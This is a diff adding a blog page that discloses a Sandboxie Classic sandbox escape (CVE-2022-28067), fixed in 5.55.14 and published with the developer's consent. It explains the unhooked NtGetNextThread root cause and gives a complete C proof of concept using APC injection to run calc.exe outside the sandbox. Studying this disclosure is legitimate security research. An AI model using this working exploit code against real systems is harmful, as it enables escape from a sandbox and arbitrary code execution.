@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="Some pieces of beef, and some vegetables too.">
+    <meta name="keyword"  content="undefined">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          Escaping Sandboxie Classic 5.55.13 - Goulash
+        
+    </title>
+
+    <link rel="canonical" href="https://hx1997.github.io/2022/04/22/escaping-sandboxie-classic-5-55-13/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@3.3.2/dist/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    
+<!-- Google Analytics -->
+<script>
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+		(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+			m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-59747917-2', 'auto');
+	ga('send', 'pageview');
+</script>
+<!-- End Google Analytics --><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Goulash</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">ABOUT</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archive/">ARCHIVES</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/animal-farm/">Animal Farm</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/links/">Links</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">TAGS</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://hx1997.github.io/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('///s3.bmp.ovh/imgs/2021/12/786122cd6225bd96.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#信息安全" title="信息安全">信息安全</a>
+                        
+                    </div>
+                    <h1>Escaping Sandboxie Classic 5.55.13</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by HX on
+                        2022-04-22 | 
+                        <span id="/2022/04/22/escaping-sandboxie-classic-5-55-13/" class="leancloud-visitors" data-flag-title="文章阅读量统计">
+                            <span class="pre-meta-item-text">👓 </span>
+                            <span class="leancloud-visitors-count"></span>
+                            <span class="post-meta-item-text"> views</span>
+                        </span>
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h3 id="whats-up">What’s Up?</h3>
+<p>I discovered a vulnerability in Sandboxie Classic &lt;= 5.55.13 (and Plus &lt;= 1.0.13 with default settings) that allowed an attacker to escape the sandbox and execute arbitrary code.</p>
+<p>The vulnerability was <a href="https://github.com/sandboxie-plus/Sandboxie/issues/1714" target="_blank" rel="external">reported to the developers</a> and was <a href="https://github.com/sandboxie-plus/Sandboxie/releases/tag/1.0.14" target="_blank" rel="external">fixed</a> a month ago. This post will be detailing the root cause of the vulnerability and is published with prior consent of the developer.</p>
+<p>The vulnerability has been assigned CNVD-2022-33480 and CVE-2022-28067.</p>
+<h3 id="discovery-and-root-cause">Discovery and Root Cause</h3>
+<p>This is a rather simple (yet powerful) vulnerability, to be honest. But since it’s my first real-world vuln, I think it merits a blog post.</p>
+<p>If you don’t want to go through the trivialities, here’s the tldr: Sandboxie didn’t hook <code>NtGetNextThread()</code>, which made it possible for a sandboxed program to obtain a writable handle to the thread(s) of an unsandboxed program. And then we used that handle to manipulate an unsandboxed thread and inject data or code by inserting APCs, and finally hijacked the thread to make it run arbitrary code.</p>
+<p>The discovery was purely by chance. One day I was wandering around on the internet, and perhaps picking up some useful information about process-related NT APIs, when bang – <a href="https://sandboxie-website-archive.github.io/www.sandboxie.com/VersionChanges.html" target="_blank" rel="external">this page</a> showed up in a google search. It’s the changelog of Sandboxie. One line in particular drew my attention -</p>
+<blockquote>
+<p>Version 4.20</p>
+<p>Released on 25 June 2015.</p>
+<ul>
+<li>Fixed SBIE2205 Service not implemented: CloseClipboard C0000058 error caused by Windows update KB3057839</li>
+<li><strong>NtGetNextProcess can be used to alter processes outside the sandbox and will now be blocked.</strong></li>
+<li>A DDE change in 4.18 broke Excel running as a forced program.</li>
+<li>Clipboard formats that were restricted in 4.18 are supported again.</li>
+<li>MS Office applications are again able to print to file inside the sandbox without errors</li>
+</ul>
+</blockquote>
+<p>Well, this hole certainly enjoyed some longevity (considering the highlighted API existed even on Vista which came out in 2007).</p>
+<p>But wait, isn’t there another API responsible for doing the same thing with threads? Turns out yes, and that twin is <code>NtGetNextThread()</code>. Give it a readable handle to a process, and it will return a handle to its threads with access rights of your choice. A quick find on page for the name of this API returned nothing, which suggested to me that it could be one of those obscure undocumented NT APIs that Sandboxie didn’t take care of.</p>
+<p>So I went to the source code of Sandboxie and searched for “<code>NtGetNextThread</code>”. Still nothing. This was a good indication that Sandboxie did not hook it, and we might have a chance to take advantage of that.</p>
+<h3 id="exploitation">Exploitation</h3>
+<p>Write a few lines of code, and you’ll be able to prove that a sandboxed program can call <code>NtGetNextThread()</code> to get a writable (even <code>THREAD_ALL_ACCESS</code>) handle to threads outside the sandbox. Now what?</p>
+<p>We can terminate threads as we want, of course, but is that all? Can we manipulate those threads and make them run malicious code?</p>
+<h4 id="first-attempt-textbook-code-injection-w-thread-hijacking">First Attempt: Textbook Code Injection w/ Thread Hijacking</h4>
+<p>As per usual, I tried to inject code into unsandboxed programs and hijack their threads to run the injected code by using <code>VirtualAllocEx()</code>, <code>WriteProcessMemory()</code>, and <code>SetThreadContext()</code>. But it turned out that because we had no handle to the remote process, we could not write code into its memory. Of course, Operating Systems 101 tells us virtual memory is allocated on a per-process basis, not per-thread (i.e., all the threads in a process share the same virtual memory space), so having access only to threads, and not their process, probably doesn’t give us access to their virtual memory.</p>
+<h4 id="second-attempt-code-gadgets">Second Attempt: Code Gadgets</h4>
+<p>If we can hijack the control flow of threads, why not just make it run snippets of existing code (i.e. code gadgets) so we won’t need to inject code? Let’s try <code>WinExec()</code>! It takes exactly two parameters which are the path to an executable you want to run, and a flag usually set to zero. By running on 64-bit Windows, we’ll only need to call <code>SetThreadContext()</code> to set the <code>rcx</code> and <code>rdx</code> of the remote thread (for parameter passing), and then hijack its <code>rip</code> to <code>WinExec()</code>, perfect!</p>
+<p>However, things don’t always go as expected. It turned out that for some unknown reason, <code>SetThreadContext()</code> will change some volatile registers’ contents (in the target thread), including <code>rcx</code>/<code>rdx</code>, so the parameter we set will be overwritten. Darn!</p>
+<p>We could have turned to other code gadgets and saw if we had any luck, but that was too much trouble, and besides, when searching for the reason why <code>SetThreadContext()</code> didn’t work, I found a paper which led me to my third attempt.</p>
+<h4 id="third-attempt-apc-injection">Third Attempt: APC Injection</h4>
+<p>Here’s <a href="https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All-wp.pdf" target="_blank" rel="external">the paper</a>, published in BlackHat USA 19. It’s an analysis of Windows process injection techniques as of 2019. It turned out to be immensely helpful, especially because it mentioned an APC injection technique that allowed you to write arbitrary data/code to remote processes <em>without</em> a handle to the process (but a writable handle to one of its threads is needed).</p>
+<p>The technique is called “memset/memmove write primitive”, and was invented by the authors of the paper. The code is pretty simple so I’ll just reproduce it here:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">HANDLE ntdll= GetModuleHandleA(<span class="string">"ntdll"</span>);</div><div class="line">HANDLE t = OpenThread(THREAD_SET_CONTEXT, FALSE, thread_id);</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(payload); i++)</div><div class="line">&#123;</div><div class="line">ntdll!NtQueueApcThread(t, GetProcAddress(ntdll, <span class="string">"memset"</span>),</div><div class="line">(<span class="keyword">void</span>*)(target_payload+i), (<span class="keyword">void</span>*)*(((BYTE*)payload)+i), <span class="number">1</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>Basically, it is just inserting APCs into the remote thread. These APCs’ entry point is <code>memset()</code>, and the parameters are passed accordingly. By <code>memset()</code>ting one byte at a time, we can write any data we want into the target process’s memory. The idea is: if we can’t write to the memory of the remote process, why not manipulate one of its threads and let it do the thing for us? We have control on the thread, and the thread has control on its own process’s memory!</p>
+<p>Once we have this write primitive, code execution is not far away: write shellcode, and hijack the thread to run it. In my case, I just wanted to demonstrate the vulnerability, so I wrote a path to <code>calc.exe</code> into the remote process, and then queued another APC to pass the path as a parameter and call <code>WinExec()</code>.</p>
+<p>The full PoC is as follows. Also available on <a href="https://github.com/hx1997/sandboxie-classic-5.55.13-escape-poc" target="_blank" rel="external">GitHub</a>.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* Sandboxie breakout vulnerability PoC</span></div><div class="line"> * Author: hx1997</div><div class="line"> */</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(NTAPI *pfnNtGetNextThread)</span><span class="params">(HANDLE, HANDLE, <span class="keyword">int</span>, DWORD, DWORD, HANDLE *)</span></span>;</div><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(NTAPI *pfnNtQueueApcThread)</span><span class="params">(HANDLE, PVOID, PVOID, PVOID, ULONG)</span></span>;</div><div class="line"></div><div class="line"><span class="function">DWORD <span class="title">getFreeSpace</span><span class="params">(HANDLE hProcess)</span> </span>&#123;</div><div class="line">	MEMORY_BASIC_INFORMATION mbi;</div><div class="line">	mbi.RegionSize = <span class="number">0x1000</span>;</div><div class="line">	</div><div class="line">	<span class="keyword">for</span> (DWORD lpAddress = <span class="number">0</span>; lpAddress &lt; <span class="number">0x80000000</span>; lpAddress += mbi.RegionSize) &#123;</div><div class="line">		VirtualQueryEx(hProcess, (LPCVOID)lpAddress, &amp;mbi, <span class="keyword">sizeof</span>(mbi));</div><div class="line">		<span class="keyword">if</span> ((mbi.State == MEM_COMMIT) &amp;&amp; (mbi.Type == MEM_MAPPED) &amp;&amp; (mbi.Protect == PAGE_READWRITE)) &#123;</div><div class="line">			<span class="keyword">return</span> lpAddress;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">foo</span><span class="params">(DWORD dwProcessId)</span> </span>&#123;</div><div class="line">	HMODULE hModule = GetModuleHandle(<span class="string">"ntdll.dll"</span>);</div><div class="line">	pfnNtGetNextThread pNtGetNextThread = (pfnNtGetNextThread)GetProcAddress(hModule, <span class="string">"NtGetNextThread"</span>);</div><div class="line">	pfnNtQueueApcThread pNtQueueApcThread = (pfnNtQueueApcThread)GetProcAddress(hModule, <span class="string">"NtQueueApcThread"</span>);</div><div class="line">	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, <span class="number">0</span>, dwProcessId);</div><div class="line">	<span class="keyword">if</span> (!hProcess) &#123;</div><div class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	<span class="comment">// BOOM! Sandboxie doesn't block NtGetNextThread, so we can get access to threads outside the box.</span></div><div class="line">	HANDLE hThread = <span class="number">0</span>;</div><div class="line">	<span class="keyword">if</span> (pNtGetNextThread(hProcess, <span class="number">0</span>, THREAD_SET_CONTEXT, <span class="number">0</span>, <span class="number">0</span>, &amp;hThread) &lt; <span class="number">0</span>) &#123;</div><div class="line">		CloseHandle(hProcess);</div><div class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	<span class="comment">// This write primitive courtesy of Amit Klein, Itzik Kotler at Safebreach in their paper</span></div><div class="line">	<span class="comment">// https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All-wp.pdf</span></div><div class="line">	DWORD target_payload = getFreeSpace(hProcess);</div><div class="line">	<span class="keyword">if</span> (target_payload == <span class="number">-1</span>) &#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"Can't find free space in the target process!\n"</span>);</div><div class="line">		CloseHandle(hProcess);</div><div class="line">		CloseHandle(hThread);</div><div class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Found free space at %p\n"</span>, target_payload);</div><div class="line">	<span class="keyword">char</span> payload[] = <span class="string">"C:\\WINDOWS\\System32\\calc.exe"</span>;</div><div class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(payload); i++)</div><div class="line">	&#123;</div><div class="line">		pNtQueueApcThread(hThread, (PVOID)GetProcAddress(hModule, <span class="string">"memset"</span>),</div><div class="line">		(<span class="keyword">void</span>*)(target_payload+i), (<span class="keyword">void</span>*)*(((BYTE*)payload)+i), <span class="number">1</span>);</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	<span class="comment">// do the classic APC injection</span></div><div class="line">	NTSTATUS ret = pNtQueueApcThread(hThread, (PVOID)WinExec, (PVOID)target_payload, <span class="number">0</span>, <span class="number">0</span>);</div><div class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"NtQueueApcThread failed with %x\n"</span>, ret);</div><div class="line">		CloseHandle(hProcess);</div><div class="line">		CloseHandle(hThread);</div><div class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">	CloseHandle(hProcess);</div><div class="line">	CloseHandle(hThread);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</div><div class="line">	DWORD dwProcessId = <span class="number">0</span>;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"Enter a PID outside the sandbox (e.g. PID of iexplore.exe): "</span>);</div><div class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;dwProcessId);</div><div class="line">	<span class="keyword">if</span> (foo(dwProcessId) &lt; <span class="number">0</span>) &#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"Injection failed!\n"</span>);</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"Injection suceeded!\n"</span>);</div><div class="line">	&#125;</div><div class="line">	system(<span class="string">"pause"</span>);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="mitigation">Mitigation</h3>
+<p>The vulnerability has been fixed in Sandboxie Classic 5.55.14 (Plus 1.0.14) by intercepting the <code>NtGetNextThread()</code> call and filtering out requests to access unsandboxed threads. Prior to this version, an extra option “Enable Object Filtering” which is turned off by default could serve as a workaround. This option works by registering callbacks for handle creation, and can block a sandboxed program from obtaining handles to unsandboxed threads.</p>
+<h3 id="acknowledgements">Acknowledgements</h3>
+<p>Thanks to David Xanatos, who is the main developer and maintainer of Sandboxie, for their quick response to my report and quick fix of the problem. Also thanks to Amit Klein and Itzik Kotler, who wrote the amazing paper and proposed the write primitive I used in my PoC.</p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2023/01/18/how-to-use-bluetooth-on-aosp-13-emulator/" data-toggle="tooltip" data-placement="top" title="安卓（AOSP）13 源码编译及模拟器使用蓝牙踩坑记">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2022/02/18/intel-x86-memory-model/" data-toggle="tooltip" data-placement="top" title="x86 的 CPU 工作模式与内存模型">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+                
+                <!-- Valine 评论框 start -->
+                <div class="comment" id="comment"></div>
+                <!-- Valine 评论框 end -->
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+
+                <!-- Friends Blog -->
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+<!-- Valine 公共JS代码 start (一个网页只需插入一次) -->
+<!--Leancloud 操作库:-->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<!--Valine 的核心代码库-->
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+    var valine_id = 'SxcVY94eFyRKqKoNsjvUdVru-gzGzoHsz';
+    var valine_key =  'gtaegP4TT3CzPJH7bwy54kkV';
+    new Valine({
+        el: '#comment',
+        appId: valine_id,
+        appKey: valine_key,
+        notify: true,
+        visitor: true,
+        placeholder: '留下邮箱才能收到评论回复通知嗷', // 留言框占位提示文字
+    });
+</script>
+<!-- Valine 公共JS代码 end -->
+
+
+
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+                    <li>
+                        <a target="_blank" href="https://www.zhihu.com/people/zack-48">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa  fa-stack-1x fa-inverse">知</i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/hx1997">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Goulash 2023 
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="https://github.com/Kaijun">Kaijun</a>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@3.3.2/dist/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.jsdelivr.net/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.jsdelivr.net/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://hx1997.github.io/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.jsdelivr.net/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://hx1997.github.io/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work --><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config("");
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="//cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+
+</body>
+
+</html>
